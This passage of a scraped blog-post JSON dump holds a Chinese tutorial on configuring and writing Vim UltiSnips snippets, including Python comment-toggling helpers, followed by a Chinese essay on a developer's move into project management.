是唯一一个所有文件都适用的代码片段,\n,配置,\n,快捷键设置，我一般使用 tab 来触发代码片段补全，,且不使用 YCM, （官方文档表示使用YCM的话就不能使用tab补全）,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nlet g:UltiSnipsExpandTrigger=\"<tab>\"\r\n\" 使用 tab 切换下一个触发点，shit+tab 上一个触发点\r\nlet g:UltiSnipsJumpForwardTrigger=\"<tab>\"\r\nlet g:UltiSnipsJumpBackwardTrigger=\"<S-tab>\"\r\n\" 使用 UltiSnipsEdit 命令时垂直分割屏幕\r\nlet g:UltiSnipsEditSplit=\"vertical\",\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,let, ,g,:,UltiSnipsExpandTrigger,=,\"<tab>\",\" 使用 tab 切换下一个触发点，shit+tab 上一个触发点,let g:UltiSnipsJumpForwardTrigger=\",<,tab,>,\",let g:UltiSnipsJumpBackwardTrigger=\",<,S,-,tab,>,\",\", ,使用, ,UltiSnipsEdit, ,命令时垂直分割屏幕,let, ,g,:,UltiSnipsEditSplit,=,\"vertical\",\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,\n,依赖,\n,ultisnips 插件需要你的 vim 支持 python，可以在 vim 命令模式下使用下面的检测你的 vim 版本是否支持 python,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n# 1 表示支持\r\n:echo has(\"python\")\r\n:echo has(\"python3\"),\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,# 1 表示支持,:,echo ,has,(,\"python\",),:,echo ,has,(,\"python3\",),\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,\n,定义一个代码片段,\n,定义格式,\n,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nsnippet 触发字符 [\"代码片段说明\" [参数]]\r\n代码片段内容\r\nendsnippet,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,snippet, ,触发字符, ,[,\"代码片段说明\", ,[,参数,],],代码片段内容,endsnippet,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,\n,最小化的一个代码片段,\n,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nsnippet if \"if (condition) { ... }\"\r\nif (${1:true}) {\r\n    $0\r\n}\r\nendsnippet,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,snippet ,if, ,\"if (condition) { ... }\",if, ,(,$,{,1,:,true,},), ,{,    ,$,0,},endsnippet,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,这时当你在 vim 中输入 if 敲 tab 就会展开一条 if 语句，第一个触发点是 if 条件表达式，最后一个是 if 语句体,\n,${1:true}, 表示这是第一个触发点，占位符为 ,true,，如果占位符没有默认值可直接使用 ,$1,, ,$2,, ,$3,…,\n,可视选择区的内容为占位符,\n,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nsnippet if \"if (...)\"\r\nif (${1:true}) {\r\n    ${VISUAL}\r\n}\r\nendsnippet,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,snippet ,if, ,\"if (...)\",if, ,(,$,{,1,:,true,},), ,{,    ,$,{,VISUAL,},},endsnippet,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,${VISUAL}, 表示在 vim 中使用可视模式下选择的文本，这个在重构代码的时候,非常有用,（,后面会有高级用法,），上个图感受一下：,\n,\n,代码片段的参数,\n,\n,b, 表示触发字符应该在一行的开始,\n,i, 表示触发字符可以在单词内（连续展示会使用这个选项）,\n,w, 表示触发字符的前后必须是一个字母分界点,\n,r, 表示触发字符可以是一个正则表达式,\n,t, 表示展开的代码片段中如果有制表符，原样输出，即使你的 vimrc 里面设置了 expandtab,\n,m, 表示删除代码片段右边的所有空白字符,\n,e, 表示自定义上下文,\n,A, 表示自动触发，不需要按 tab，类似于 VIM 中的 abbr,\n,\n,内容解释器,\n,Ultisnips 定义的代码片段中支持三种不同的语言注入：shell, vimscript, python，在代码片段中用反引号表示,\n,shell 代码,\n,就是在你的命令行 shell 能执行的代码片段，比如输出当前时间,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n➜ date\r\n2018年 8月27日 星期一 18时19分38秒 CST,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,➜, ,date,2018,年, ,8,月,27,日, ,星期一, ,18,时,19,分,38,秒, ,CST,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,在代码片段中用反引号「`」引用即可,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nsnippet today\r\nToday is the `date`.\r\nendsnippet,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,snippet ,today,Today ,is, ,the, ,`,date,`,.,endsnippet,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,输入 today 按 tab 展开后（格式和上面shell中的不一样，估计是因为 vim 语言设置的问题）：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nToday is the Mon Aug 27 18:24:51 CST 2018.,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,Today ,is, ,the ,Mon ,Aug, ,27, ,18,:,24,:,51, ,CST, ,2018.,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,\n,vimscript 代码,\n,使用 ,indent, 来输出当前缩进值，使用前缀 ,!v, 表示是 vimscript,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nsnippet indent\r\nIndent is: `!v indent(\".\")`.\r\nendsnippet,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,snippet ,indent,Indent ,is,:, ,`,!,v, ,indent,(,\".\",),`,.,endsnippet,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,\n,python 代码,\n,在代码片段中解释执行 python 代码是 ultisnips 最强大的功能，以前缀 ,!p, 开始。系统会向 python 中注入一些变量，可以使用 python 代码直接对其进行操作,\n,\n,fn, – 表示当前文件名,\n,path, – 当前文件名的路径,\n,t, – 占位符的字典，可以使用 ,t[1], t[2], t.v, 来取占位符内容,\n,snip, – ,UltiSnips.TextObjects.SnippetUtil, 对象的一个实例,\n,match, – 正则代码片段时返回的匹配元素（非常强大）,\n,\n,其中最常用的 ,snip, 对象提供了下面一些变量：,\n,\n,snip.rv, 表示 return value，python 代码执行后处理过的字符串赋给 rv 即可,\n,snip.fn, 表示当前文件名,\n,snip.ft, 表示当前文件类型,\n,snip.v, 表示 VISUAL 模式变量，其中 ,snip.v.mode, 表示模式类型，,snip.v.text, 表示 VISUAL 模式中选择的字符,\n,\n,\n,占位符选择,\n,UltiSnips 支持使用快捷键切换占位符，我使用 ,<tab>, 和 ,<shift-tab>, 来切换 ,下一个, 和 ,上一个,占位符，占位符切换的作用域为当前代码片段内部（即使占位符已被修改过），当光标移动出去以后就不起作用了,\n,\n,自定义上下文,\n,自定义上下文可以通过正则匹配来决定代码片断是否可用，比如判断在指定的 if 语句里面才起作用的代码片断，定义格式如下：,\n,snippet 触发字符 “描述” “表达式” 参数,\n,比如我们定义一个 ,只有, 在上一行以 ,if (DEVELOPMENT) {, 开头才可以展开的代码片段,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nsnippet dbg \"if (DEVELOPMENT) dbg\" \"re.match('^if ,\\(DEVELOPMENT\\), \\{', snip.buffer[snip.line-1])\" be\r\ndebugger;\r\nendsnippet,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,snippet ,dbg, ,\"if (DEVELOPMENT) dbg\", ,\"re.match('^if ,\\,(,DEVELOPMENT,\\,), \\{', snip.buffer[snip.line-1])\", ,be,debugger,;,endsnippet,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,\n,常见用法,\n,行内连续展开,\n,这个常见于需要连续展开代码片段的情况，比如，有两个片段，一个打印变量，一个处理 JSON 序列化。这时需要使用参数选项 ,i,n-word,\n,\n,使用正则代码片段,\n,通常写代码的时候需要使用 log, print 等来打印上下文中的变量。使用普通片段按 cl 展示 console.log() 然后把变量字符复制进括号，这样操作会比较复杂。使用正则来动态匹配前面的字符可以很好的解决这个问题,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n# 展开 console.log\r\nsnippet \"([^\\s]\\w+)\\.log\" \"console.log(postfix)\" r\r\nconsole.log(`!p snip.rv = match.group(1)`)$0\r\nendsnippet\r\n# 当前行转换成大写\r\nsnippet \"([^\\s].*)\\.upper\" \"Uppercase(postfix)\" r\r\n`!p snip.rv = match.group(1).upper()`$0\r\nendsnippet\r\n# 上一个单词转换成小写\r\nsnippet \"([^\\s]\\w+)\\.lower\" \"Lowercase(postfix)\" r\r\n`!p snip.rv = match.group(1).lower()`$0\r\nendsnippet,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,10,11,12,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,# 展开 console.log,snippet, ,\"([^\\s]\\w+)\\.log\", ,\"console.log(postfix)\", ,r,console,.,log,(,`,!,p, ,snip,.,rv, ,=, ,match,.,group,(,1,),`,),$,0,endsnippet,# 当前行转换成大写,snippet, ,\"([^\\s].*)\\.upper\", ,\"Uppercase(postfix)\", ,r,`,!,p, ,snip,.,rv, ,=, ,match,.,group,(,1,),.,upper,(,),`,$,0,endsnippet,# 上一个单词转换成小写,snippet, ,\"([^\\s]\\w+)\\.lower\", ,\"Lowercase(postfix)\", ,r,`,!,p, ,snip,.,rv, ,=, ,match,.,group,(,1,),.,lower,(,),`,$,0,endsnippet,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,动图演示,\n,\n,注意,：正则代码片段只适用于单行文本处理，如果是多行转换还是得用到下面的 python + VISUAL 代码片段来处理,\n,使用 python 解释器 + VISUAL 模式实现代码注释功能,\n,通常我们需要使用一大堆插件来实现各种代码的注释功能。不过 Ultisnips 提供了 VISUAL 模式可以提取 vim 可视模式中选择的内容到代码片段里面，于是我们就可以结合起来制作一个,具有注释功能的代码片段,\n,流程大概是这样的：,\n,\n,进入 vim 可视模式，选择要注释的内容,\n,按 tab，清除选择内容,\n,输入代码片段触发字符，按 tab 完成,\n,\n,由于实现的 python 代码相对复杂一些，主要分成两个方法。单行注释和多行注释，注意 Ultisnips 中可以直接写 python 但是大段的方法建议放在插件目录下面的 pythonx 目录下面，使用的时候在对应的代码片段中的全局 python 代码 ,global !p, 引入即可,\n,单行注释,(pythonx/javascript_snippets.py)：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\ndef comment(snip, START=\"\", END=\"\"):\r\n    lines = snip.v.text.split('\\n')[:-1]\r\n    first_line = lines[0]\r\n    spaces = ''\r\n    initial_indent = snip._initial_indent\r\n\r\n    # Get the first non-empty line\r\n    for idx, l in enumerate(lines):\r\n        if l.strip() != '':\r\n            first_line = lines[idx]\r\n            sp = re.findall(r'^\\s+', first_line)\r\n            if len(sp):\r\n                spaces = sp[0]\r\n            break            \r\n\r\n    # Uncomment\r\n    if first_line.strip().startswith(START):\r\n        result = [line.replace(START, \"\", 1).replace(END, \"\", 1) if line.strip() else line for line in lines]\r\n    else:\r\n        result = [f'{spaces}{START}{line[len(spaces):]}{END}' if line.strip() else line for line in lines ]\r\n\r\n    # Remove initial indent\r\n    if result[0] and initial_indent:\r\n        result[0] = result[0].replace(initial_indent, '', 1)\r\n\r\n    if result:\r\n        return '\\n'.join(result)\r\n    else:\r\n        return '',\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,def ,comment,(,snip,,, ,START,=,\"\",,, ,END,=,\"\",),:,    ,lines, ,=, ,snip,.,v,.,text,.,split,(,'\\n',),[,:,-,1,],    ,first_line, ,=, ,lines,[,0,],    ,spaces, ,=, ,'',    ,initial_indent, ,=, ,snip,.,_initial_indent, ,    ,# Get the first non-empty line,    ,for, ,idx,,, ,l, ,in, ,enumerate,(,lines,),:,        ,if, ,l,.,strip,(,), ,!=, ,'',:,            ,first_line, ,=, ,lines,[,idx,],            ,sp, ,=, ,re,.,findall,(,r,'^\\s+',,, ,first_line,),            ,if, ,len,(,sp,),:,                ,spaces, ,=, ,sp,[,0,],            ,break,            , ,    ,# Uncomment,    ,if, ,first_line,.,strip,(,),.,startswith,(,START,),:,        ,result, ,=, ,[,line,.,replace,(,START,,, ,\"\",,, ,1,),.,replace,(,END,,, ,\"\",,, ,1,), ,if, ,line,.,strip,(,), ,else, ,line ,for, ,line ,in, ,lines,],    ,else,:,        ,result, ,=, ,[,f,'{spaces}{START}{line[len(spaces):]}{END}', ,if, ,line,.,strip,(,), ,else, ,line ,for, ,line ,in, ,lines, ,], ,    ,# Remove initial indent,    ,if, ,result,[,0,], ,and, ,initial_indent,:,        ,result,[,0,], ,=, ,result,[,0,],.,replace,(,initial_indent,,, ,'',,, ,1,), ,    ,if, ,result,:,        ,return, ,'\\n',.,join,(,result,),    ,else,:,        ,return, ,'',\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,多行注释：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\ndef comment_inline(snip, START=\"/* \", END=\" */\"):\r\n    text = snip.v.text\r\n    lines = text.split('\\n')[:-1]\r\n    first_line = lines[0]\r\n    initial_indent = snip._initial_indent\r\n    spaces = ''\r\n\r\n    # Get the first non-empty line\r\n    for idx, l in enumerate(lines):\r\n        if l.strip() != '':\r\n            first_line = lines[idx]\r\n            sp = re.findall(r'^\\s+', first_line)\r\n            if len(sp):\r\n                spaces = sp[0]\r\n            break            \r\n\r\n    if text.strip().startswith(START):\r\n        result = text.replace(START, '', 1).replace(END, '', 1)\r\n    else:\r\n        result = text.replace(spaces, spaces + START, 1).rstrip('\\n') + END + '\\n'\r\n\r\n    if initial_indent:\r\n        result = result.replace(initial_indent, '', 1)\r\n\r\n    return result,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,def ,comment_inline,(,snip,,, ,START,=,\"/* \",,, ,END,=,\" */\",),:,    ,text, ,=, ,snip,.,v,.,text,    ,lines, ,=, ,text,.,split,(,'\\n',),[,:,-,1,],    ,first_line, ,=, ,lines,[,0,],    ,initial_indent, ,=, ,snip,.,_initial_indent,    ,spaces, ,=, ,'', ,    ,# Get the first non-empty line,    ,for, ,idx,,, ,l, ,in, ,enumerate,(,lines,),:,        ,if, ,l,.,strip,(,), ,!=, ,'',:,            ,first_line, ,=, ,lines,[,idx,],            ,sp, ,=, ,re,.,findall,(,r,'^\\s+',,, ,first_line,),            ,if, ,len,(,sp,),:,                ,spaces, ,=, ,sp,[,0,],            ,break,            , ,    ,if, ,text,.,strip,(,),.,startswith,(,START,),:,        ,result, ,=, ,text,.,replace,(,START,,, ,'',,, ,1,),.,replace,(,END,,, ,'',,, ,1,),    ,else,:,        ,result, ,=, ,text,.,replace,(,spaces,,, ,spaces, ,+, ,START,,, ,1,),.,rstrip,(,'\\n',), ,+, ,END, ,+, ,'\\n', ,    ,if, ,initial_indent,:,        ,result, ,=, ,result,.,replace,(,initial_indent,,, ,'',,, ,1,), ,    ,return, ,result,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,代码片段定义：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nglobal !p\r\nfrom javascript_snippets import (\r\n\tcomment, comment_inline\r\n)\r\nendglobal\r\n\r\n# ...\r\n\r\nsnippet c \"Toggle comment every single line\"\r\n`!p\r\nsnip.rv = comment(snip, START='// ', END='')\r\n`$0\r\nendsnippet\r\n\r\nsnippet ci \"Toggle comment inline.\"\r\n`!p\r\nsnip.rv = comment_inline(snip, START=\"/* \", END=\" */\")\r\n`$0\r\nendsnippet,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,global, ,!,p,from ,javascript_snippets ,import, ,(,\t,comment,,, ,comment,_,inline,),endglobal, ,# ..., ,snippet, ,c, ,\"Toggle comment every single line\",`,!,p,snip,.,rv, ,=, ,comment,(,snip,,, ,START,=,'// ',,, ,END,=,'',),`,$,0,endsnippet, ,snippet ,ci, ,\"Toggle comment inline.\",`,!,p,snip,.,rv, ,=, ,comment_inline,(,snip,,, ,START,=,\"/* \",,, ,END,=,\" */\",),`,$,0,endsnippet,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,动图演示,\n,\n,不同的语言可以在对应的片段文件中定义并传入注释符号参数即可，有了这个功能就可以愉快的删除其它的 vim 注释插件了 😀,\n\r\n        \r\n        \r\n        \n    ,\n        , ,2, 赞,\n        ,  收藏,\n\n                    ,  评论,\n        \n        \n        \n        ,\n        ,\n            ,\n            ,\n            ,\n            ,\n            ,\n        ,\n\n    ,\n\n\n\n\r\n        ,\r\n\r\n,\r\n\t\r\n\t,\r\n\t关于作者：,keelii,\r\n\t,\r\n\t,\r\n\t\t,\r\n\t\t\t,\r\n\t\t,\r\n\t,\r\n\r\n    ,\r\n\r\n        ,\r\n            It’s not who you are underneath, it’s what you do that defines you        ,\r\n        ,\r\n            , 个人主页, ·\r\n            , 我的文章,\r\n\r\n             · , 7, · , , , , ,         ,\r\n    ,\r\n\t,\r\n,\r\n\r\n,\r\n\t", "url": "http://blog.jobbole.com/114334/", "url_object_id": "c528881ac1c8d1c7d99e285d0256bff1", "front_image_path": "full/4c6abd763d27eeeb4c7e7665f213388ec74df623.jpg"},{"front_image_url": ["http://jbcdn2.b0.upaiyun.com/2017/11/90129c6662feee86738bd3663ce83108.png"], "title": "从技术转管理，我做了什么来拯救自己？", "create_time": "2018/09/04", "vote": "2", "bookmark": "2", "comments": "2", "content": "\r\n\r\n        \t\t\t,\n\t\t\r\n\t\t,本文作者： ,伯乐在线, - ,zer0Black, 。未经作者许可，禁止转载！,欢迎加入伯乐在线 ,专栏作者,。,我是一名新手项目经理，转项目管理岗1年半。在做管理之前，我是一名开发。也就是说，我是最常见的技术转管理了。,\n,最开始，我极度不适应这个岗位。很累，但是不见成效。经过一年多的摸索，我终于在工作中总结出了一些心得，一些套路。所以我想给技术转管理的同学们讲一讲：,\n,我做了什么，来拯救自己,\n,个人背景和公司背景,\n,1.目前为止工作4年半，也就是说，我做了3年开发，1年半管理,\n2.我是一名野生程序员（就是非计算机专业毕业）,\n3.我写过Android、iOS、web页面、java后端、python后端等等，看起来像传说中的全栈程序员。但其实心知肚明，我就是那种啥都会但啥也不行的程序员,\n4.公司此前做产品，后来在产品的基础上转型外包扩大规模,\n5.公司转型的基础上，我也转型成了管理,\n6.我司项目经理是一个专门的职位，负责项目管理、技术架构、客户对接。总之项目的一切相关问题，包括技术问题，都由项目经理负责,\n,我做了什么,\n,事必躬亲，会毁了团队也会毁了自己,\n,这恐怕是所有从技术转管理的人，都会犯的通病。我刚开始带团队的时候，核心代码都要自己写。然后看同事进度的时候总是嫌这个慢，那个不行的。看不下去了索性自己上手吭哧吭哧写好。弄得自己非常疲惫。,\n,通常技术能力强的人，更有机会转型管理岗。所以在带团队的过程中，总是情不自禁的亲自动手完成别人应该做的事情。最终结果就是总会替代同事做他们自己本应该做的事情。,\n,但这个行为对管理者来说，只会让管理者越来越疲惫。而对整个团队来说，更是温水煮青蛙，一步一步把团队带进深渊。管理者负担太多工作，导致团队长期无法成长。轻则导致管理者累崩。重则导致项目崩塌、团队分崩离析。,\n,我应该怎么办：,\n实际上，影响别人去做好一件事，比亲自去做要难的多。而我处理这个问题的方式,\n1.忍住自己亲自动手的心理,\n2.复杂任务拆解细化，分派任务时明确任务目标和验收标准,\n3.分派任务时给予同事鼓励，对他们保持充分信任,\n4.有难度的任务，提供一定的辅助或者培训,\n,多想、多说、多做,\n,我开始带团队的时候，一直忙于处理各种各样的项目问题，写代码、沟通需求、进度汇报、现场演示。大部分时间都埋头于项目本身，以为只要把项目做好，按时交付就行。做的太多， 导致思考的时间少了，对团队同事的关注也就少了。,\n,而一个团队领导者，多做是应该的，更重要的是多思考，多说,\n,思考什么：,\n1.项目干系人是否清楚，干系人不清楚会导致项目管理混乱，出的东西不满足要求,\n2.需求是否合理，需求是否可以优化、技术架构是否满足需求,\n3.功能是否拆解到位，任务分派是否可合理,\n4.若尝试新技术，是否有把握在出问题的时候力挽狂澜,\n5.团队成员状态如何，要如何激励他们,\n6.项目流程是否合理，如何改进,\n7.项目成本如何控制，时间节点如何把握，质量如何保证,\n,以上都是我目前每个项目都会思考的问题。项目管理者一定要告诫自己：,不要用战术上的勤奋掩盖战略上的懒惰,\n,说什么：,\n1.需求不清楚要问,\n2.需求可以优化要说，不要闷声发大财，坑的是自己,\n3.有困难处理不了要及时汇报给领导，悉知客户,\n4.团队成员有问题要给予正确指导，而不是放任自由,\n5.进度情况、项目情况要积极和客户保持沟通,\n,不仅是监督，更要是指引,\n,“那个功能写完了吗？”；“这个功能怎么还没做好”；“你这个东西什么时候能够写完”。,\n,以上是我日常工作中最常做的事情，即便到了目前，我依然在做这些事。监督催促同事干活！每天像个监工一样，漫步在同事周围，监督他们的进度，在他们耳边逼逼叨。,\n,但我认为，催促同事干活的不应该是项目经理，而是项目流程，是规则。每个人明确自己的角色，各司其职，由规则约束着大家前行。而不是简单靠项目经理赶着大家往前走。,\n,但我并没有做好这个工作，目前还是处于制定计划、监督执行的死循环中。对于规则、流程只是有个模糊的想法，还不成型，也未经试验。暂不与大家分享。,\n,救火能力固然重要，但更要防范于未然,\n,我由技术转管理的初期，最擅长的事情就是技术。所以一直在项目中充当救火队员的角色。,\n,有突发情况？我自己来；没有人能攻克技术难点？那我自己来；开发了很久，发现需求理解错误？咔咔咔自己一顿改；总之就是这有问题，咔咔咔自己一顿弄，那有问题，嗒嗒嗒自己一顿搞。总用自己的技术能力挽救项目中的各种突发情况。,\n,而作为一个项目管理者，救火能力固然重要，要在关键时刻能够站出来力挽狂澜。但更重要的，我想是如何去避免突发情况吧。而要避免突发情况，就要思考如何做好风险管理。提早做好准备，把可能出现的未知风险扼杀在襁褓中。,\n,在IT项目管理中，我认为风险主要存在于以下几点，应思考准备以便规避风险：,\n1.需求变更。开发中需求变更是难免的，但如何控制需求变更，如何管理需求变更是我们着重要考虑的问题。SCALPEL方法，大家可以了解一下,\n2.项目干系人不清楚，导致项目需求分歧,\n3.技术难点预估不足。总是会存在开发过程中才发某项功能无法实现或者实现成本过高，这主要是由于前期对需求理解不足，对自我或团队太自信造成的,\n4.计划制定问题。开发计划制定有问题，可能由于错误的估计了团队的能力，项目的难度造成的。计划风险通常是由项目经理自己造成，需自我强化、学习、思考来避免此问题,\n5.组织成员问题。开发成员不足、人员离职、其它项目需紧急支援人手、团队沟通不畅都可能引起此问题,\n6.流程风险。过于流程化，导致流程工作占用太多开发时间，流程和灵活是一对冲突的概念。如何解决项目管理中流程化和灵活度的问题，我认为是项目经理较重要的能力之一,\n7.性能问题。开发过程中，最怕的是功能做完了，最后发现性能不行。导致前期开发工作全白费。所以在需求阶段，软件的用户量，数据量都是要考虑在内的。在开发之初，就要在程序设计过程中将性能问题考虑进去,\n,保持内心强大,\n,项目管理是一个磨人的工作。虽然外面说要做风险管理，但突发情况避免不了。一个合格的项目管理者，要有泰山崩于前而色不变的内心。,\n,需求变了不要紧、计划变了不要紧、成员情况发生变化不要紧。毕竟我们都知道,世界上唯一不变的就是变化,，尽可能的给自己准备好,Plan B,\n,背黑锅要上，邀功也要上,\n,我相信各位做开发的时候，最讨厌的就是那种黑锅你背，有功他领的leader。既然如此，希望我们也不要变成这样的人。,\n,项目经理嘛，统管这个项目的一切。项目出了问题，不管因为什么原因，都一定是项目经理的责任。你的同事可能在项目里表现不佳，你的客户可能经常变更需求。不管多少理由，都不是你甩锅的理由。有锅一定要自己扛着，所以，,背黑锅要上,。,\n,做的好，也要说出来。超出客户预期的项目闪光点，要告诉客户团队的优秀。项目完成的不错，要告诉老板团队的优秀。让客户让老板知道你们团队做的好，下一次他们才会给你们更充分的信任。项目成员表现优秀的地方，不光要表扬，也要和上级说。你是和你团队成员接触最紧密的人，他们的有点别人不知道，但你知道。所以他们优秀的地方，要宣扬，要让别的部门知道，要让上级知道。所以,邀功也要上,。,\n,在帮派里，不能为兄弟们挡刀并引领兄弟们前进的老大是不值得追随的，弟兄们在你手下做事受尽委屈，争不了一口气，那这个老大也做不长。,\n,技术出身的管理者中，我相信,背黑锅要上,是大家都能做到的。但技术人员不善言辞，总是闷头干活，不会表达。所以要适当学会邀功，为团队邀功。希望大家都能学会,邀功也要上,\n,不要抛弃技术，它可能是你的救命良药,\n,做项目管理以后，尤其是像我现在这种一个人带多个项目的情况。管理工作会占用每天极多的时间。这是工作本身需要你做的，无可厚非。我想说的是，即便如此，也要保证自己对技术的学习。,\n,了解新技术也好，写写开源项目也好，总之要保持对技术的持续学习。他总能在你需要的时候帮到你。,\n,学如逆水行舟,不进则退,，与大家共勉,\n,总结,\n,总体而言，我认为一个新手项目经理，要学会以下事情：,\n1.要学会带领团队成长，不要事必躬亲,\n2.要多进行思考,\n3.要学会风险管理,\n4.要保持内心的强大,\n5.要学会邀功,\n,以上，就是我想和大家分享的内容，其中很多点，我自己做的也不是很好，依然需要自我练习和努力。希望各位技术转管理的同学，都能尽快适应自己的工作。,\n,\n,\n\r\n        \r\n        \r\n        \n    ,\n        , ,2, 赞,\n        , 2 收藏,\n\n                    , 2 评论,\n        \n        \n        \n        ,\n        ,\n            ,\n            ,\n            ,\n            ,\n            ,\n        ,\n\n    ,\n\n\n\n\r\n        ,\r\n\r\n,\r\n\t\r\n\t,\r\n\t关于作者：,zer0Black,\r\n\t,\r\n\t,\r\n\t\t,\r\n\t\t\t,\r\n\t\t,\r\n\t,\r\n\r\n    ,\r\n\r\n        ,\r\n            目前工作为移动开发，兴趣广泛，计算机各方面均有强烈兴趣。        ,\r\n        ,\r\n            , 个人主页, ·\r\n            , 我的文章,\r\n\r\n             · , 26, · ,         ,\r\n    ,\r\n\t,\r\n,\r\n\r\n,\r\n\t", "url": "http://blog.jobbole.com/113815/", "url_object_id": "34647675114e93c21bd8bb2e9ed09743", "front_image_path": "full/f49c8437c74dd90a906b7a9579e6520f3044c962.jpg"},{"front_image_url": ["http://jbcdn2.b0.upaiyun.com/2018/10/d1aa5a9343099d2decbb150c0a46356d.png"], 